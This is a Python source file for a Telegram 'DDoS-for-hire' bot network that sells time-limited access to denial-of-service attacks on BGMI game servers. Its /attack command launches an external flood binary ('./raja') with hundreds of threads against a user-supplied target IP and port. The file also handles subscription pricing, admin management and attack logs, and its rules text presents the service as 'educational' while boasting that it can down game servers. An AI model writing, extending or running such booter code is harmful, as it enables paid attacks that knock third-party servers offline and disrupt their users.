import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess
from datetime import datetime, timedelta
import time
import os
import sqlite3
from keep_alive import keep_alive
from db import initialize_db
from threading import Thread
import tempfile

DB_FILE = 'bot_data.db'
keep_alive()
Attack = {}

if not os.path.exists(DB_FILE):
    initialize_db()

def db_connection():
    conn = sqlite3.connect(DB_FILE)
    conn.execute('PRAGMA journal_mode=WAL;')
    cursor = conn.cursor()
    cursor.execute("BEGIN IMMEDIATE")
    return conn

def read_users(bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    current_datetime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('SELECT user_id, expiration_date FROM users WHERE expiration_date > ? AND bot_id = ?', (current_datetime,bot_id,))
    users = cursor.fetchall()
    conn.close()
    return [user[0] for user in users], [user[1] for user in users]

def read_admins(bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT admin_id FROM admins WHERE bot_id = ?', (bot_id,))
    admins = cursor.fetchall()
    conn.close()
    return [admin[0] for admin in admins]

def clear_logs():
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM logs')
    conn.commit()
    conn.close()

def add_user(user_id, days, bot_id):
    expiration_date = datetime.now() + timedelta(days=days)
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_date, bot_id)
        VALUES (?, ?, ?)
    ''', (user_id, expiration_date, bot_id))
    conn.commit()
    conn.close()

def add_bot(token, bot_name, bot_username, owner_username, channel_username):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO bot_configs (token, bot_name, bot_username, owner_username, channel_username)
        VALUES (?, ?, ?, ?, ?)
    ''', (token, bot_name, bot_username, owner_username, channel_username))
    conn.commit()
    conn.close()

def remove_user(user_id, bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM users WHERE user_id = ? AND bot_id = ?', (user_id, bot_id,))
    conn.commit()
    conn.close()

def add_admin(admin_id, bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO admins (admin_id, bot_id)
        VALUES (?, ?)
    ''', (admin_id, bot_id,))
    conn.commit()
    conn.close()

def remove_admin(admin_id, bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM admins WHERE admin_id = ? AND bot_id = ?', (admin_id, bot_id,))
    conn.commit()
    conn.close()
    
def get_bot_id(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT id FROM bot_configs WHERE token = ?', (token,))
    bot_id = cursor.fetchone()
    conn.close()
    return bot_id[0] if bot_id else None

def get_bot_username(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT bot_username FROM bot_configs WHERE id = ?', (token,))
    bot_username = cursor.fetchone()
    conn.close()
    return bot_username[0] if bot_username else None

def get_bot_name(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT bot_name FROM bot_configs WHERE id = ?', (token,))
    bot_name = cursor.fetchone()
    conn.close()
    return bot_name[0] if bot_name else None

def get_owner_name(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT owner_username FROM bot_configs WHERE id = ?', (token,))
    owner_name = cursor.fetchone()
    conn.close()
    return owner_name[0] if owner_name else None

def get_channel_name(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT channel_username FROM bot_configs WHERE id = ?', (token,))
    channel_name = cursor.fetchone()
    conn.close()
    return channel_name[0] if channel_name else None

def fetch_bot_tokens():
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT token FROM bot_configs')
    bot_tokens = list(set(cursor.fetchall()))
    conn.close()
    return [token[0] for token in bot_tokens]

def initialize_bot(bot, bot_id):
    def log_command(user_id, target, port, time, command):
        conn = db_connection()
        cursor = conn.cursor()
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
        cursor.execute('''INSERT INTO logs (user_id, username, target, port, time, command, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)''', (user_id, username, target, port, time, command, datetime.now().isoformat(' '),))
        conn.commit()
        conn.close()
    
    @bot.message_handler(commands=['add'])
    def add_user_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 2:
                user_to_add = command[1]
                try:
                    days = int(command[2])
                    add_user(user_to_add, days, bot_id)
                    response = f"User {user_to_add} Added Successfully with an expiration of {days} days 👍."
                except ValueError:
                    response = "Invalid number of days specified 🤦."
            else:
                response = "Please specify a user ID to add 😒.\n✅ Usage: /add <userid> <days>"
        else:
            response = "Purchase Admin Permission to use this command."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['admin_add'])
    def add_admin_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 1:
                admin_to_add = command[1]
                if admin_to_add not in allowed_admin_ids:
                    add_admin(admin_to_add, bot_id)
                    response = f"Admin {admin_to_add} Added Successfully 👍."
                else:
                    response = f"Admin {admin_to_add} already exists👍."
            else:
                response = "Please specify an Admin's user ID to add 😒.\n✅ Usage: /admin_add <userid>"
        else:
            response = "Purchase Admin Permission to use this command."
        bot.reply_to(message, response)
        
    @bot.message_handler(commands=['add_bot'])
    def add_user_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 5:
                token = command[1]
                bot_name = command[2]
                bot_username = command[3]
                owner_username = command[4]
                channel_username = command[5]
                try:
                    add_bot(token, bot_name, bot_username, owner_username, channel_username)
                    response = f"Bot : {bot_username} Deployed Successfully🥰."
                except ValueError:
                    response = "Invalid entries🤦."
            else:
                response = "Please specify a token to add 😒.\n✅ Usage: /add_bot <token> <bot_name> <bot_username> <owner_username> <channel_username>"
        else:
            response = "Purchase Admin Permission to use this command."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['remove'])
    def remove_user_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 1:
                user_to_remove = command[1]
                remove_user(user_to_remove, bot_id)
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = "Please Specify A User ID to Remove. \n✅ Usage: /remove <userid>"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['admin_remove'])
    def remove_admin_command(message):
        admin_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if admin_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 1:
                admin_to_remove = command[1]
                remove_admin(admin_to_remove, bot_id)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = "Please Specify An Admin ID to Remove. \n✅ Usage: /admin_remove <userid>"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['clearlogs'])
    def clear_logs_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('DELETE FROM logs')
            conn.commit()
            conn.close()
            response = "Logs Cleared Successfully ✅"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['allusers'])
    def show_all_users(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            user_ids, expirations = read_users(bot_id)
            response = "Authorized Users:\n"
            for user_id, exp_date in zip(user_ids, expirations):
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username
                    response += f"- @{username} (ID: {user_id}) | Expires on: {exp_date}\n"
                except Exception as e:
                    response += f"- User ID: {user_id} | Expires on: {exp_date}\n"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['alladmins'])
    def show_all_admins(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            admins = read_admins(bot_id)
            response = "Authorized Admins:\n"
            for admin_id in admins:
                try:
                    admin_info = bot.get_chat(int(admin_id))
                    username = admin_info.username
                    response += f"- @{username} (ID: {admin_id})\n"
                except Exception as e:
                    response += f"- User ID: {admin_id}\n"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['allbots'])
    def show_all_users(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT token, bot_name, bot_username, owner_username, channel_username FROM bot_configs')
            bots = cursor.fetchall()
            conn.close()
            response = "Authorized Bots :\n"
            for token, bot_name, bot_username, owner_username, channel_username in bots:
                response += f"- {bot_username} (Token: {token}) | Owner: {owner_username}\n"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['logs'])
    def show_recent_logs(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM logs')
            logs = cursor.fetchall()
            conn.close()
            if logs:
                response = "Recent Logs:\n"
                for log in logs:
                    response += f"{log}\n"
    
                with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                    temp_file.write(response.encode('utf-8'))
    
                bot.send_document(message.chat.id, open(temp_file.name, 'rb'), caption="Recent Logs")
                os.remove(temp_file.name)
            else:
                response = "No data found"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['mylogs'])
    def show_command_logs(message):
        user_id = str(message.chat.id)
        allowed_user_ids, expirations = read_users(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_user_ids:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM logs WHERE user_id = ?', (user_id,))
            logs = cursor.fetchall()
            conn.close()
            if logs:
                response = "Your Command Logs:\n"
                for log in logs:
                    response += f"{log}\n"
    
                with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                    temp_file.write(response.encode('utf-8'))
    
                bot.send_document(message.chat.id, open(temp_file.name, 'rb'), caption="Your Command Logs")
                os.remove(temp_file.name)
            else:
                response = "No Command Logs Found For You."
        else:
            response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
        bot.reply_to(message, response)

    
    @bot.message_handler(commands=['id'])
    def show_user_id(message):
        user_id = str(message.chat.id)
        response = f"🤖Your ID: {user_id}"
        bot.reply_to(message, response)
    
    def start_attack_reply(message, target, port, time, owner_name):
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        chat_id = message.chat.id
        global Attack
        threads_per_instance = 700
        num_instances = (900 // threads_per_instance)
        core_mapping = [0, 0, 1, 1, 0, 0, 1, 1, 0]
        for i in range(num_instances):
            full_command = ['nohup', './raja', str(target), str(port), str(time), str(threads_per_instance)]
            core = core_mapping[i % len(core_mapping)]
            taskset_command = ['taskset', '-c', str(core)] + full_command
            attack_process = subprocess.Popen(taskset_command)
            Attack[chat_id] = attack_process
        scheduled_time = datetime.now() + timedelta(seconds=time)
        Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("😎BGMI KI CHUD GAI😂", callback_data="♥️♥️♥️♥️♥️" + str(chat_id)))
        response = f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
        bot.reply_to(message, response, reply_markup=markup)
    
    attack_cooldown = {}
    COOLDOWN_TIME = 10
    
    @bot.message_handler(commands=['attack'])
    def handle_attack(message):
        user_id = str(message.chat.id)
        allowed_user_ids, expirations = read_users(bot_id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_user_ids or user_id in allowed_admin_ids:
            if user_id not in allowed_admin_ids:
                if user_id in attack_cooldown and (datetime.now() - attack_cooldown[user_id]).seconds < 10:
                    response = "You Are On Cooldown . Please Wait 10 seconds Before Running The /attack Command Again."
                    bot.reply_to(message, response)
                    return
                attack_cooldown[user_id] = datetime.now()
            command = message.text.split()
            if len(command) == 4:
                target = command[1]
                port = int(command[2])
                time = int(command[3])
                if user_id not in allowed_admin_ids and time > 301:
                    response = "Error: Time interval must be less than 300."
                else:
                    log_command(user_id, target, port, time, '/attack')
                    start_attack_reply(message, target, port, time, owner_name)
                    return
            else:
                response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
        else:
            response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
        bot.reply_to(message, response)
    
    def finish_message(message, target, port, attack_time, owner_name, scheduled_time):
        global Attack
        chat_id = message.chat.id
        while datetime.now() < scheduled_time:
            time.sleep(1)
        if chat_id in Attack and Attack[chat_id] is not None:
            response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
            bot.reply_to(message, response)
    
    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_attack_"))
    def handle_callback_query(call):
        chat_id = int(call.data.split("_")[-1])
        if chat_id in Attack and Attack[chat_id] is not None:
            Attack[chat_id].kill()
            try:
                Attack[chat_id].wait(timeout=5)
                response = "Attack stopped successfully."
            except subprocess.TimeoutExpired:
                response = "Failed to stop the attack in time."
            Attack[chat_id] = None
        else:
            response = "No running attacks to be stopped."
        bot.reply_to(call.message, response)
    
    @bot.message_handler(commands=['help'])
    def show_help(message):
        channel_name = get_channel_name(bot_id)
        bot_name = get_bot_name(bot_id)
        bot_username = get_bot_username(bot_id)
        help_text = f'''😍Welcome to {channel_name}, {bot_name} ({bot_username})\n\n🤖 Available commands:\n💥 /attack : Method For Bgmi Servers. \n💥 /rules : Please Check Before Use !!.\n💥 /mylogs : To Check Your Recents Attacks.\n💥 /plan : Checkout Our Botnet Rates.\n\n🤖 To See Admin Commands:\n💥 /admincmd : Shows All Admin Commands.\n\n'''
        for handler in bot.message_handlers:
            if hasattr(handler, 'commands'):
                if message.text.startswith('/help'):
                    help_text += f"{handler.commands[0]}: {handler.doc}\n"
                elif handler.doc and 'admin' in handler.doc.lower():
                    continue
                else:
                    help_text += f"{handler.commands[0]}: {handler.doc}\n"
        bot.reply_to(message, help_text)
    
    @bot.message_handler(commands=['start'])
    def welcome_start(message):
        user_name = message.from_user.first_name
        channel_name = get_channel_name(bot_id)
        bot_name = get_bot_name(bot_id)
        bot_username = get_bot_username(bot_id)
        response = f'''👋🏻Welcome to our {channel_name}, {bot_name} ({bot_username}), {user_name}!\nFeel Free to Explore the bot.\n🤖Try To Run This Command : /help \n'''
        bot.reply_to(message, response)
        
    @bot.message_handler(commands=['ping'])
    def check_ping(message):
        start_time = time.time()
        bot.reply_to(message, "Pong!")
        ping = (time.time() - start_time) * 1000 / 5
        bot.send_message(message.chat.id, f"Bot Ping : {ping:.2f} ms")
    
    @bot.message_handler(commands=['rules'])
    def welcome_rules(message):
        user_name = message.from_user.first_name
        owner_name = get_owner_name(bot_id)
        response = f'''Please Follow These Rules ❗:\n\n1. We are not responsible for any D-DoS attacks, send by our bot. This bot is only for educational purpose and it's source code freely available in github.!!\n2. D-DoS Attacks will expose your IP Address to the Attacking server. so do it with your own risk. \n3. The power of D-DoS is enough to down any game's server. So kindly don't use it to down a website server..!!\n\nFor more : {owner_name}'''
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['plan'])
    def welcome_plan(message):
        user_name = message.from_user.first_name
        owner_name = get_owner_name(bot_id)
        response = f'''Offer :\n1) 3 Days - ₹120/Acc,\n2) 7 Days - ₹250/Acc,\n3) 15 Days - ₹500/Acc,\n4) 30 Days - ₹1000/Acc,\n5) 60 Days (Full Season) - ₹2000/Acc\n\nDm to make purchase {owner_name}\n\n\nNote : All Currencies Accepted via Binance.'''
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['admincmd'])
    def welcome_admin(message):
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:\n\n💥 /add <userId> : Add a User.\n💥 /remove <userid> Remove a User.\n💥 /allusers : Authorised Users Lists.\n💥 /logs : All Users Logs.\n💥 /broadcast : Broadcast a Message.\n💥 /clearlogs : Clear The Logs File.\n'''
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['broadcast'])
    def broadcast_message(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split(maxsplit=1)
            if len(command) > 1:
                message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
                allowed_user_ids, expirations = read_users(bot_id)
                for user_id in allowed_user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
                response = "Broadcast Message Sent Successfully To All Users 👍."
            else:
                response = "🤖 Please Provide A Message To Broadcast."
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['id'])
    def show_user_id(message):
        user_id = str(message.chat.id)
        response = f"🤖Your ID: {user_id}"
        bot.reply_to(message, response)
    
    return bot

def start_bot(bot, bot_id):
    initialize_bot(bot, bot_id)
    print(f"\n{bot_id}) Starting bot with token {bot.token}...")
    bot.infinity_polling() #bot.polling(none_stop=True, interval=0, timeout=0) --for normal polling

threads = [20]
bot_tokens = fetch_bot_tokens()
bots = [telebot.TeleBot(token) for token in bot_tokens]
for bot in bots:
    bot_id = get_bot_id(bot.token)
    thread = Thread(target=start_bot, args=(bot,bot_id,))
    thread.start()
    threads.append(thread)
    thread.join()
